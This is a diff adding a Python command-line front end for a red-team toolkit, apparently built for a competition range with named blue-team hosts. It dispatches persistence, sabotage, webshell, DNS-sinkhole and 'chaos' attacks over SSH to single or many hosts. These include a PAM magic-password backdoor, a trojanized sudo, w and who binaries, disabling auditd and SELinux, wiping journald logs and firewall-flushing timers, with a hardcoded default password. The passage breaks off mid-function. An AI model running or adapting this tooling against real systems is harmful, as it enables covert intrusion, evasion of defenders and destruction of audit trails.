@@ -1,0 +1,1419 @@
+#!/usr/bin/env python3
+"""dessabox -unified CLI for the odessa red team toolkit"""
+
+import argparse
+import io
+import os
+import subprocess
+import sys
+
+# Force UTF-8 output (handles Windows cp1252 terminals and WSL equally)
+if hasattr(sys.stdout, "buffer"):
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
+if hasattr(sys.stderr, "buffer"):
+    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace", line_buffering=True)
+
+TOOL_DIR = os.path.dirname(os.path.realpath(__file__))
+
+# ── colours ───────────────────────────────────────────────────────────────────
+R  = "\033[0;31m"
+G  = "\033[0;32m"
+Y  = "\033[1;33m"
+C  = "\033[0;36m"
+B  = "\033[1m"
+NC = "\033[0m"
+
+def banner():
+    print(f"""{C}{B}
+  ██████╗ ███████╗███████╗███████╗ █████╗ ██████╗  ██████╗ ██╗  ██╗
+  ██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
+  ██║  ██║█████╗  ███████╗███████╗███████║██████╔╝██║   ██║ ╚███╔╝
+  ██║  ██║██╔══╝  ╚════██║╚════██║██╔══██║██╔══██╗██║   ██║ ██╔██╗
+  ██████╔╝███████╗███████║███████║██║  ██║██████╔╝╚██████╔╝██╔╝ ██╗
+  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+{NC}  {Y}odessa rt toolkit  ·  categories: persist deploy sabotage webshell net chaos info{NC}
+""")
+
+def run(cmd, *, check=False):
+    """Execute a command list, inheriting stdio."""
+    return subprocess.run(cmd, check=check)
+
+def script(rel_path, *args, sudo=False):
+    """Build a command list for a toolkit script."""
+    full = os.path.join(TOOL_DIR, rel_path)
+    if not os.path.isfile(full):
+        print(f"{R}[!]{NC} script not found: {full}")
+        sys.exit(1)
+    cmd = ["sudo", "bash", full, *args] if sudo else ["bash", full, *args]
+    return cmd
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PERSIST
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_persist(args):
+    sub = args.persist_cmd
+
+    if sub == "linux":
+        extra = [args.lhost] if args.lhost else []
+        extra += [str(args.lport)] if args.lport else []
+        run(script("persist/linux_persist.sh", args.ip, args.user, args.passwd, *extra))
+
+    elif sub == "ad":
+        extra = [args.lhost] if args.lhost else []
+        run(script("persist/ad_persist.sh", args.dc_ip, args.domain, args.admin, args.passwd, *extra))
+
+    elif sub == "redis":
+        extras = []
+        for v in [args.port, args.redis_pass, args.lhost, args.lport]:
+            if v is not None:
+                extras.append(str(v))
+            else:
+                break
+        run(script("persist/redis_persist.sh", args.ip, *extras))
+
+    elif sub == "ureadahead":
+        cmd = script("ureadahead-persist.sh", args.action)
+        if args.action == "install" and args.key:
+            cmd += ["--key", args.key]
+        run(cmd, sudo=(args.action == "install"))
+
+    elif sub == "shadow-cron":
+        run(script("shadow-crond.sh", args.action, sudo=True))
+
+    elif sub == "vim":
+        run(script("vim-persist.sh"))
+
+    elif sub == "path-hijack":
+        cmd = script("path-hijack.sh", args.action)
+        if args.level:
+            cmd += ["--level", args.level]
+        if args.payload:
+            cmd += ["--payload", str(args.payload)]
+        if args.key:
+            cmd += ["--key", args.key]
+        run(cmd)
+
+    elif sub == "evil-timer":
+        run(script("evil-timer/deploy-evil-timer.sh", args.action))
+
+    elif sub == "pam":
+        run(script("pam-backdoor/deploy-pam-backdoor.sh", args.action, sudo=True))
+
+    else:
+        persist_parser.print_help()
+
+
+def add_persist(subs):
+    global persist_parser
+    persist_parser = subs.add_parser("persist", help="persistence methods",
+        description="Persistence methods -- SSH keys, cron, systemd, PAM, Redis, AD")
+    ps = persist_parser.add_subparsers(dest="persist_cmd", metavar="METHOD")
+    persist_parser.set_defaults(func=cmd_persist)
+
+    # linux
+    p = ps.add_parser("linux", help="multi-method Linux persistence (SSH key, cron, systemd, SUID, rc hook)")
+    p.add_argument("ip");   p.add_argument("user");  p.add_argument("passwd", metavar="pass")
+    p.add_argument("lhost", nargs="?");  p.add_argument("lport", nargs="?", type=int)
+
+    # ad
+    p = ps.add_parser("ad", help="AD persistence -DCSync, golden ticket, backdoor domain admin, AdminSDHolder")
+    p.add_argument("dc_ip");  p.add_argument("domain");  p.add_argument("admin");  p.add_argument("passwd", metavar="pass")
+    p.add_argument("lhost", nargs="?")
+
+    # redis
+    p = ps.add_parser("redis", help="Redis RDB write -> SSH key injection + cron backdoor")
+    p.add_argument("ip")
+    p.add_argument("port", nargs="?", type=int, default=6379)
+    p.add_argument("redis_pass", nargs="?", metavar="redis_pass", default="")
+    p.add_argument("lhost", nargs="?");  p.add_argument("lport", nargs="?", type=int)
+
+    # ureadahead
+    p = ps.add_parser("ureadahead", help="persistence as ureadahead boot-prefetch service (firewall flush + SSH key + watchdog)")
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("--key", metavar="PUBKEY", help="SSH public key to inject")
+
+    # shadow-cron
+    p = ps.add_parser("shadow-cron", help="hidden second cron daemon (invisible to crontab -l / systemctl)")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    # vim
+    p = ps.add_parser("vim", help="vim autocmd backdoor -inject firewall-flush payload into every .vimrc")
+
+    # path-hijack
+    p = ps.add_parser("path-hijack", help="PATH directory injection -transparent command wrappers re-asserting persistence")
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("--level", choices=["user","system","cron"], help="injection level (default: user)")
+    p.add_argument("--payload", type=int, choices=[1,2,3], help="payload tier: 1=ssh key, 2=+SUID bash, 3=+full chaos")
+    p.add_argument("--key", metavar="PUBKEY")
+
+    # evil-timer
+    p = ps.add_parser("evil-timer", help="python2-certbot.timer disguise -flushes firewall every 10 min")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    # pam
+    p = ps.add_parser("pam", help="PAM backdoor -magic password bypasses all auth for any user")
+    p.add_argument("action", choices=["install","remove","status"])
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DEPLOY
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── known Linux hosts (mirrors mass-deploy.sh LINUX_HOSTS) ───────────────────
+LINUX_HOSTS = {
+    "svc-ftp-01":      "10.10.10.101",
+    "svc-redis-01":    "10.10.10.102",
+    "svc-database-01": "10.10.10.103",
+    "svc-amazin-01":   "10.10.10.104",
+    "svc-samba-01":    "10.10.10.105",
+    "blue-ubnt-01":    "10.10.10.106",
+    "blue-ubnt-02":    "10.10.10.107",
+    "blue-ubnt-03":    "10.10.10.108",
+    "blue-ubnt-04":    "10.10.10.109",
+}
+
+_HOST_HELP = "  named hosts: " + "  ".join(
+    f"{n}={ip}" for n, ip in LINUX_HOSTS.items()
+)
+
+
+def _add_conn(p):
+    """Add shared targeting + SSH connection flags to a deploy subparser."""
+    tgt = p.add_argument_group("target (pick one)")
+    tgt.add_argument("-t", "--target", metavar="USER@HOST",
+        help="single arbitrary SSH target")
+    tgt.add_argument("--host", dest="named_hosts", metavar="NAME",
+        action="append",
+        help=f"named host (repeatable).\n{_HOST_HELP}")
+    tgt.add_argument("--all", dest="all_hosts", action="store_true",
+        help="all Linux hosts in the built-in list")
+
+    conn = p.add_argument_group("SSH connection")
+    conn.add_argument("-u", "--user", default="root", metavar="USER",
+        help="SSH username (host/all mode, default: root)")
+    conn.add_argument("-p", "--pass", dest="ssh_pass", metavar="PASS")
+    conn.add_argument("-i", "--identity", metavar="FILE",
+        help="SSH private key file")
+    conn.add_argument("-P", "--port", default="22", metavar="PORT")
+    conn.add_argument("-S", "--sudo-pass", dest="sudo_pass", metavar="PASS")
+    conn.add_argument("--no-sudo", action="store_true",
+        help="skip sudo (already SSH'd as root)")
+    conn.add_argument("-j", "--jobs", type=int, metavar="N",
+        help="max parallel jobs (host/all mode, default: 9)")
+    conn.add_argument("--dry-run", action="store_true",
+        help="print commands without running (host/all mode)")
+    conn.add_argument("-v", "--verbose", action="store_true")
+
+
+def _dispatch(args, tool_name, tool_args):
+    """Route attack to rt-ssh.sh (single) or mass-deploy.sh (multi)."""
+    import tempfile
+
+    modes = sum([
+        bool(args.target),
+        bool(args.named_hosts),
+        bool(args.all_hosts),
+    ])
+    if modes == 0:
+        print(f"{R}[!]{NC} specify a target: --target USER@HOST  |  --host NAME  |  --all")
+        sys.exit(1)
+    if modes > 1:
+        print(f"{R}[!]{NC} --target, --host, and --all are mutually exclusive")
+        sys.exit(1)
+
+    # ── validate named hosts ──────────────────────────────────────────────────
+    if args.named_hosts:
+        for h in args.named_hosts:
+            if h not in LINUX_HOSTS:
+                print(f"{R}[!]{NC} unknown host '{h}'.  Known: {', '.join(LINUX_HOSTS)}")
+                sys.exit(1)
+
+    # ── single target via rt-ssh.sh ───────────────────────────────────────────
+    if args.target:
+        cmd = ["bash", os.path.join(TOOL_DIR, "rt-ssh.sh"),
+               "-t", args.target]
+        if args.ssh_pass:  cmd += ["-p", args.ssh_pass]
+        if args.identity:  cmd += ["-i", args.identity]
+        if args.port != "22": cmd += ["-P", args.port]
+        if args.sudo_pass: cmd += ["-S", args.sudo_pass]
+        if args.no_sudo:   cmd += ["--no-sudo"]
+        if args.verbose:   cmd += ["-v"]
+        cmd += [tool_name] + tool_args
+        run(cmd)
+        return
+
+    # ── mass-deploy.sh (named hosts or all) ──────────────────────────────────
+    mass_cmd = ["bash", os.path.join(TOOL_DIR, "mass-deploy.sh")]
+    if args.user != "root":  mass_cmd += ["-u", args.user]
+    if args.ssh_pass:        mass_cmd += ["-p", args.ssh_pass]
+    if args.identity:        mass_cmd += ["-i", args.identity]
+    if args.port != "22":    mass_cmd += ["-P", args.port]
+    if args.sudo_pass:       mass_cmd += ["-S", args.sudo_pass]
+    if args.no_sudo:         mass_cmd += ["--no-sudo"]
+    if args.jobs:            mass_cmd += ["-j", str(args.jobs)]
+    if args.dry_run:         mass_cmd += ["--dry-run"]
+    if args.verbose:         mass_cmd += ["-v"]
+
+    if args.named_hosts:
+        ips = [LINUX_HOSTS[h] for h in args.named_hosts]
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".hosts", delete=False) as f:
+            f.write("\n".join(ips) + "\n")
+            tmp = f.name
+        print(f"{G}[+]{NC} targeting {len(ips)} host(s): {', '.join(args.named_hosts)}")
+        try:
+            run(mass_cmd + ["--hosts", tmp] + [tool_name] + tool_args)
+        finally:
+            os.unlink(tmp)
+    else:
+        print(f"{G}[+]{NC} targeting all {len(LINUX_HOSTS)} Linux hosts")
+        run(mass_cmd + [tool_name] + tool_args)
+
+
+# ── per-attack deploy handlers ────────────────────────────────────────────────
+
+def _d_shadow_cron(args):    _dispatch(args, "shadow-crond",    [args.action])
+def _d_journal(args):        _dispatch(args, "nuke-journal",    [args.action])
+def _d_ureadahead(args):
+    ta = [args.action]
+    if getattr(args, "key", None): ta += ["--key", args.key]
+    _dispatch(args, "ureadahead-persist", ta)
+def _d_busybox(args):        _dispatch(args, "lock-busybox",    [args.action])
+def _d_evil_timer(args):     _dispatch(args, "evil-timer",      [args.action])
+def _d_poison_timer(args):   _dispatch(args, "poison-timer",    [args.action])
+def _d_no_apt(args):         _dispatch(args, "no-apt",          [args.action])
+def _d_no_audit(args):       _dispatch(args, "no-audit",        [args.action])
+def _d_no_selinux(args):     _dispatch(args, "no-selinux",      [args.action])
+def _d_break_net(args):      _dispatch(args, "break-net-tools", [args.action])
+def _d_pam(args):            _dispatch(args, "pam-backdoor",    [args.action])
+def _d_compromise_who(args): _dispatch(args, "compromise-who",  [args.action])
+def _d_infinite_users(args):
+    ta = [args.action]
+    if getattr(args, "passwd", None): ta.append(args.passwd)
+    _dispatch(args, "infinite-users", ta)
+def _d_sudo_binary(args):    _dispatch(args, "sudo-binary",     [args.action])
+def _d_vandalize(args):      _dispatch(args, "vandalize-bashrc",[args.action])
+def _d_alias_bashrc(args):   _dispatch(args, "alias-bashrc",    [args.action])
+def _d_vim(args):            _dispatch(args, "vim-persist",     [args.action])
+def _d_toucher(args):
+    ta = [args.action]
+    if getattr(args, "root",  None): ta.append(args.root)
+    if getattr(args, "delay", None): ta.append(str(args.delay))
+    _dispatch(args, "the-toucher", ta)
+def _d_sinkhole(args):
+    ta = [args.action, args.domain]
+    if getattr(args, "sink_ip", None): ta.append(args.sink_ip)
+    _dispatch(args, "sinkhole", ta)
+def _d_pihole(args):         _dispatch(args, "pihole-sinkhole", [])
+def _d_path_hijack(args):
+    ta = [args.action]
+    if getattr(args, "level",    None): ta += ["--level",    args.level]
+    if getattr(args, "payload",  None): ta += ["--payload",  str(args.payload)]
+    if getattr(args, "key",      None): ta += ["--key",      args.key]
+    if getattr(args, "commands", None): ta += ["--commands", args.commands]
+    _dispatch(args, "path-hijack", ta)
+def _d_path_hijack_user(args):
+    ta = [args.action]
+    if getattr(args, "key",      None): ta += ["--key",      args.key]
+    if getattr(args, "commands", None): ta += ["--commands", args.commands]
+    _dispatch(args, "path-hijack-user", ta)
+def _d_madness(args):
+    run(script("let-the-madness-begin.sh"))
+
+
+def cmd_deploy(args):
+    if not hasattr(args, "deploy_func"):
+        deploy_parser.print_help()
+    else:
+        args.deploy_func(args)
+
+
+def add_deploy(subs):
+    global deploy_parser
+    deploy_parser = subs.add_parser("deploy", help="deploy any attack to one or more targets",
+        description=(
+            "Deploy any attack via SSH to a single target (--target),\n"
+            "a selection of named hosts (--host, repeatable), or all Linux\n"
+            "hosts (--all).  Single targets use rt-ssh.sh; multi-host uses\n"
+            "mass-deploy.sh in parallel.\n\n" + _HOST_HELP
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    ds = deploy_parser.add_subparsers(dest="deploy_cmd", metavar="ATTACK")
+    deploy_parser.set_defaults(func=cmd_deploy)
+
+    def ap(name, help_txt, func):
+        p = ds.add_parser(name, help=help_txt,
+            formatter_class=argparse.RawDescriptionHelpFormatter)
+        p.set_defaults(deploy_func=func)
+        return p
+
+    # ── persistence ──────────────────────────────────────────────────────────
+    p = ap("shadow-cron",  "hidden 2nd cron daemon (invisible to crontab -l / systemctl)", _d_shadow_cron)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("journal",      "nuke journald - Storage=none + wipe + LogLevelMax=0", _d_journal)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("ureadahead",   "ureadahead service disguise (firewall flush + SSH key + watchdog)", _d_ureadahead)
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("--key", metavar="PUBKEY", help="SSH public key to inject")
+    _add_conn(p)
+
+    p = ap("busybox",      "gate busybox behind a token - blue team gets fake segfault", _d_busybox)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("evil-timer",   "python2-certbot.timer disguise (user-level, no sudo)", _d_evil_timer)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("poison-timer", "firewall-flushing timer (root-level)", _d_poison_timer)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("pam",          "PAM backdoor - magic password bypasses all auth for any user", _d_pam)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("vim",          "vim autocmd payload in every .vimrc (firewall flush on open)", _d_vim)
+    p.add_argument("action", choices=["install","remove"])
+    _add_conn(p)
+
+    p = ap("path-hijack",  "PATH injection wrappers (system/cron level, root)", _d_path_hijack)
+    p.add_argument("action", choices=["scan","install"])
+    p.add_argument("--level",    choices=["system","cron"])
+    p.add_argument("--payload",  type=int, choices=[1,2,3],
+        help="1=ssh key  2=+SUID bash  3=+full chaos")
+    p.add_argument("--key",      metavar="PUBKEY")
+    p.add_argument("--commands", metavar="CMDS",
+        help="comma-separated commands to wrap")
+    _add_conn(p)
+
+    p = ap("path-hijack-user", "PATH injection wrappers (user-level, no sudo)", _d_path_hijack_user)
+    p.add_argument("action", choices=["scan","install"])
+    p.add_argument("--key",      metavar="PUBKEY")
+    p.add_argument("--commands", metavar="CMDS")
+    _add_conn(p)
+
+    # ── sabotage ─────────────────────────────────────────────────────────────
+    p = ap("no-apt",       "break apt - prevents blue team package installs",   _d_no_apt)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("no-audit",     "kill auditd + shadow auditctl with no-op wrapper", _d_no_audit)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("no-selinux",   "disable SELinux + shadow setenforce/getenforce/sestatus", _d_no_selinux)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("break-net",    "hobble curl / wget / git (reversible)", _d_break_net)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("sudo-binary",  "replace sudo binary with backdoored wrapper", _d_sudo_binary)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    # ── chaos ────────────────────────────────────────────────────────────────
+    p = ap("compromise-who", "trojanize w + who binaries (hides our sessions)", _d_compromise_who)
+    p.add_argument("action", choices=["install","remove"])
+    _add_conn(p)
+
+    p = ap("infinite-users", "hijack all nologin service accounts for SSH access", _d_infinite_users)
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("passwd", nargs="?", help="password for accounts (default: rt2025!delta)")
+    _add_conn(p)
+
+    p = ap("vandalize-bashrc", "vandalize all .bashrc files with RT ASCII art", _d_vandalize)
+    p.add_argument("action", choices=["install","remove","status"])
+    _add_conn(p)
+
+    p = ap("alias-bashrc", "inject aliases into all .bashrc files", _d_alias_bashrc)
+    p.add_argument("action", choices=["install","remove"])
+    _add_conn(p)
+
+    p = ap("toucher",      "wander filesystem touching random files (floods inotify)", _d_toucher)
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("root",   nargs="?", default="/")
+    p.add_argument("delay",  nargs="?", type=float, default=0.1)
+    _add_conn(p)
+
+    # ── network ──────────────────────────────────────────────────────────────
+    p = ap("sinkhole",     "dnsmasq DNS sinkhole for a domain", _d_sinkhole)
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("domain", help="domain to sinkhole (e.g. github.com)")
+    p.add_argument("sink_ip", nargs="?", help="IP to redirect to (default: 127.0.0.1)")
+    _add_conn(p)
+
+    p = ap("pihole",       "Pi-hole sinkhole for all GitHub domains (one-shot)", _d_pihole)
+    _add_conn(p)
+
+    # ── meta ─────────────────────────────────────────────────────────────────
+    p = ap("madness",      "pull latest from GitHub + mass-deploy everything", _d_madness)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SABOTAGE
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_sabotage(args):
+    sub = args.sabotage_cmd
+
+    if sub == "net":
+        run(script("break-net-tools.sh", args.action, sudo=True))
+
+    elif sub == "apt":
+        run(script("no-apt.sh", args.action, sudo=True))
+
+    elif sub == "audit":
+        run(script("no-audit.sh", args.action, sudo=True))
+
+    elif sub == "selinux":
+        run(script("no-selinux.sh", args.action, sudo=True))
+
+    elif sub == "sudo":
+        run(script("sudo-biNOry.sh", args.action, sudo=True))
+
+    elif sub == "busybox":
+        cmd = script("lock-busybox.sh", args.action, sudo=True)
+        if args.token:
+            cmd += ["--token", args.token]
+        run(cmd)
+
+    elif sub == "nuke-journal":
+        run(script("nuke-journal.sh", args.action, sudo=True))
+
+    else:
+        sabotage_parser.print_help()
+
+
+def add_sabotage(subs):
+    global sabotage_parser
+    sabotage_parser = subs.add_parser("sabotage", help="break/neuter defensive tools",
+        description="Sabotage -- disrupt audit, networking tools, apt, SELinux, sudo, busybox, journald")
+    ss = sabotage_parser.add_subparsers(dest="sabotage_cmd", metavar="TARGET")
+    sabotage_parser.set_defaults(func=cmd_sabotage)
+
+    p = ss.add_parser("net", help="hobble curl, wget, git -silently broken, originals backed up")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    p = ss.add_parser("apt", help="break apt package manager -prevents blue team installs")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    p = ss.add_parser("audit", help="disable auditd + shadow auditctl with a no-op wrapper")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    p = ss.add_parser("selinux", help="disable SELinux enforcement + shadow setenforce/getenforce")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    p = ss.add_parser("sudo", help="replace sudo binary with backdoored wrapper (backs up real sudo first)")
+    p.add_argument("action", choices=["install","remove","status"])
+
+    p = ss.add_parser("busybox", help="gate busybox behind a secret token -blue team gets a fake segfault")
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("--token", help="secret token (default: rt2025!delta)")
+
+    p = ss.add_parser("nuke-journal", help="Storage=none + wipe history + LogLevelMax=0 drop-ins (nothing survives)")
+    p.add_argument("action", choices=["install","remove","status","wipe"])
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# WEBSHELL
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_webshell(args):
+    sub = args.webshell_cmd
+
+    if sub == "lamp":
+        extras = []
+        for v in [args.smb_user, args.smb_pass, args.web_port]:
+            if v is not None:
+                extras.append(str(v))
+        run(script("webshells/deploy_lamp_shell.sh", args.ip, *extras))
+
+    elif sub == "flask":
+        extras = []
+        for v in [args.web_port, args.redis_port, args.lhost, args.lport]:
+            if v is not None:
+                extras.append(str(v))
+        run(script("webshells/deploy_nginx_flask_shell.sh", args.ip, *extras))
+
+    else:
+        webshell_parser.print_help()
+
+
+def add_webshell(subs):
+    global webshell_parser
+    webshell_parser = subs.add_parser("webshell", help="deploy webshells",
+        description="Webshell deployment -- LAMP stack + Flask/Nginx/Redis")
+    ws = webshell_parser.add_subparsers(dest="webshell_cmd", metavar="TARGET")
+    webshell_parser.set_defaults(func=cmd_webshell)
+
+    p = ws.add_parser("lamp", help="LAMP stack: SMB upload -> Apache webroot, SSH drop, log poisoning, PHPMyAdmin upload")
+    p.add_argument("ip")
+    p.add_argument("smb_user", nargs="?", default="guest")
+    p.add_argument("smb_pass", nargs="?", default="")
+    p.add_argument("web_port", nargs="?", type=int, default=80)
+
+    p = ws.add_parser("flask", help="Flask/Nginx/Redis: SSTI probe, Redis session forgery, off-by-slash path traversal, debug PIN crack")
+    p.add_argument("ip")
+    p.add_argument("web_port",   nargs="?", type=int, default=80)
+    p.add_argument("redis_port", nargs="?", type=int, default=6379)
+    p.add_argument("lhost", nargs="?")
+    p.add_argument("lport", nargs="?", type=int)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# NET
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_net(args):
+    sub = args.net_cmd
+
+    if sub == "sinkhole":
+        extras = [args.sink_ip] if args.sink_ip else []
+        run(script("sinkhole-scripts.sh", args.domain, *extras, sudo=True))
+
+    elif sub == "pihole":
+        run(script("pihole-github-sinkhole.sh", sudo=True))
+
+    else:
+        net_parser.print_help()
+
+
+def add_net(subs):
+    global net_parser
+    net_parser = subs.add_parser("net", help="DNS sinkholes",
+        description="Network -- DNS sinkholes via dnsmasq / Pi-hole")
+    ns = net_parser.add_subparsers(dest="net_cmd", metavar="METHOD")
+    net_parser.set_defaults(func=cmd_net)
+
+    p = ns.add_parser("sinkhole", help="redirect all DNS queries for a domain to a sink IP via dnsmasq")
+    p.add_argument("domain")
+    p.add_argument("sink_ip", nargs="?")
+
+    p = ns.add_parser("pihole", help="install Pi-hole + sinkhole all GitHub-related domains")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CHAOS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_chaos(args):
+    sub = args.chaos_cmd
+
+    if sub == "toucher":
+        extras = [args.action]
+        if args.root:   extras.append(args.root)
+        if args.delay:  extras.append(str(args.delay))
+        run(script("the-toucher.sh", *extras))
+
+    elif sub == "w-who":
+        run(script("compromise-w-who.sh", sudo=True))
+
+    elif sub == "dotify":
+        run(script("dotify.sh", args.directory))
+
+    elif sub == "users":
+        extras = [args.passwd] if args.passwd else []
+        run(script("infinite-users.sh", args.action, *extras, sudo=True))
+
+    elif sub == "fish":
+        run(script("install-fish.sh", sudo=True))
+
+    elif sub == "alias-bashrc":
+        run(script("alias-bashrc.sh", args.action, sudo=True))
+
+    elif sub == "vandalize-bashrc":
+        run(script("vandalize-bashrc.sh", args.action, sudo=True))
+
+    else:
+        chaos_parser.print_help()
+
+
+def add_chaos(subs):
+    global chaos_parser
+    chaos_parser = subs.add_parser("chaos", help="filesystem / user / shell chaos",
+        description="Chaos -- filesystem noise, trojanized binaries, infinite users, .bashrc vandalism")
+    cs = chaos_parser.add_subparsers(dest="chaos_cmd", metavar="OP")
+    chaos_parser.set_defaults(func=cmd_chaos)
+
+    p = cs.add_parser("toucher", help="wander the filesystem and touch random files (floods inotify watchers)")
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("root",   nargs="?", default="/",  help="starting directory (default: /)")
+    p.add_argument("delay",  nargs="?", type=float, default=0.1, help="seconds between touches (default: 0.1)")
+
+    p = cs.add_parser("w-who", help="trojanize w and who -binaries replaced with wrappers that hide our sessions")
+
+    p = cs.add_parser("dotify", help="prepend a dot to every file in a directory (makes them hidden)")
+    p.add_argument("directory")
+
+    p = cs.add_parser("users", help="hijack all nologin service accounts for SSH access")
+    p.add_argument("action", choices=["install","remove","status"])
+    p.add_argument("passwd", nargs="?", help="password for accounts (default: rt2025!delta)")
+
+    p = cs.add_parser("fish", help="install fish shell + create fish-user (confuses blue team shell hunters)")
+
+    p = cs.add_parser("alias-bashrc", help="inject aliases into every .bashrc found on the system")
+    p.add_argument("action", choices=["install","remove"])
+
+    p = cs.add_parser("vandalize-bashrc", help="vandalize every .bashrc found on the system")
+    p.add_argument("action", choices=["install","remove","status"])
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# INFO
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_info(args):
+    sub = args.info_cmd
+
+    if sub == "one-liners":
+        run(script("one-liners.sh"))
+
+    elif sub == "tools":
+        print(f"""
+{C}{B}dessabox -tool map{NC}
+
+{Y}persist{NC}
+  linux         persist/linux_persist.sh        SSH key, cron, systemd, SUID bash, rc hook
+  ad            persist/ad_persist.sh           DCSync, golden ticket, backdoor DA, AdminSDHolder
+  redis         persist/redis_persist.sh        Redis RDB write -> SSH key + cron
+  ureadahead    ureadahead-persist.sh           ureadahead service disguise
+  shadow-cron   shadow-crond.sh                 Hidden 2nd cron daemon
+  vim           vim-persist.sh                  vim autocmd payload in every .vimrc
+  path-hijack   path-hijack.sh                  PATH injection wrappers
+  evil-timer    evil-timer/deploy-evil-timer.sh python2-certbot.timer disguise (firewall flush)
+  pam           pam-backdoor/deploy-pam-backdoor.sh  Magic-password PAM module
+
+{Y}deploy{NC}
+  ssh           rt-ssh.sh                       Run any tool on a single target (no disk writes)
+  mass          mass-deploy.sh                  Fan out to all Linux targets in parallel
+  madness       let-the-madness-begin.sh        Pull + mass deploy everything
+
+{Y}sabotage{NC}
+  net           break-net-tools.sh              Hobble curl / wget / git
+  apt           no-apt.sh                       Break apt
+  audit         no-audit.sh                     Kill auditd + shadow auditctl
+  selinux       no-selinux.sh                   Permissive mode + shadow tools
+  sudo          sudo-biNOry.sh                  Replace sudo binary
+  busybox       lock-busybox.sh                 Token-gate busybox
+  nuke-journal  nuke-journal.sh                 Storage=none + wipe + LogLevelMax=0 drop-ins
+
+{Y}webshell{NC}
+  lamp          webshells/deploy_lamp_shell.sh  SMB -> Apache / SSH / log poison / PHPMyAdmin
+  flask         webshells/deploy_nginx_flask_shell.sh  SSTI / Redis session / off-by-slash / debug PIN
+
+{Y}net{NC}
+  sinkhole      sinkhole-scripts.sh             dnsmasq sinkhole for any domain
+  pihole        pihole-github-sinkhole.sh       Pi-hole sinkhole for all GitHub domains
+
+{Y}chaos{NC}
+  toucher       the-toucher.sh                  Touch random files across filesystem
+  w-who         compromise-w-who.sh             Trojanize w + who binaries
+  dotify        dotify.sh                       Hide files by prepending dots
+  users         infinite-users.sh               Create infinite nologin users
+  fish          install-fish.sh                 Install fish + fish-user
+  alias-bashrc  alias-bashrc.sh                 Inject aliases into all .bashrc files
+  vandalize-bashrc vandalize-bashrc.sh          Vandalize all .bashrc files
+
+{Y}info{NC}
+  one-liners    one-liners.sh                   Print one-liner reference sheet
+  tools         (this screen)
+""")
+
+    else:
+        info_parser.print_help()
+
+
+def add_info(subs):
+    global info_parser
+    info_parser = subs.add_parser("info", help="reference / tool map")
+    isc = info_parser.add_subparsers(dest="info_cmd", metavar="TOPIC")
+    info_parser.set_defaults(func=cmd_info)
+
+    isc.add_parser("one-liners", help="print the red-team one-liner reference sheet")
+    isc.add_parser("tools", help="print the full tool map (script -> dessabox command)")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# INTERACTIVE MENU
+# ─────────────────────────────────────────────────────────────────────────────
+
+import types as _types
+
+_W = 58  # menu column width
+
+def _clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+def _hdr(title):
+    pad = max(0, _W - len(title) - 4)
+    print(f"\n  {C}{B}── {title} {'─' * pad}{NC}\n")
+
+def _ask(prompt, default=None, ex=None):
+    """Required input. Shows [default] in brackets and optional example."""
+    if ex:
+        for line in (ex if isinstance(ex, list) else [ex]):
+            print(f"  {B}    e.g. {line}{NC}")
+    d = f" [{default}]" if default is not None else ""
+    while True:
+        v = input(f"  {Y}{prompt}{d}: {NC}").strip()
+        if v:           return v
+        if default is not None: return str(default)
+        print(f"  {R}  required{NC}")
+
+def _opt(prompt, default="", ex=None):
+    """Optional input. Enter to keep default or skip."""
+    if ex:
+        for line in (ex if isinstance(ex, list) else [ex]):
+            print(f"  {B}    e.g. {line}{NC}")
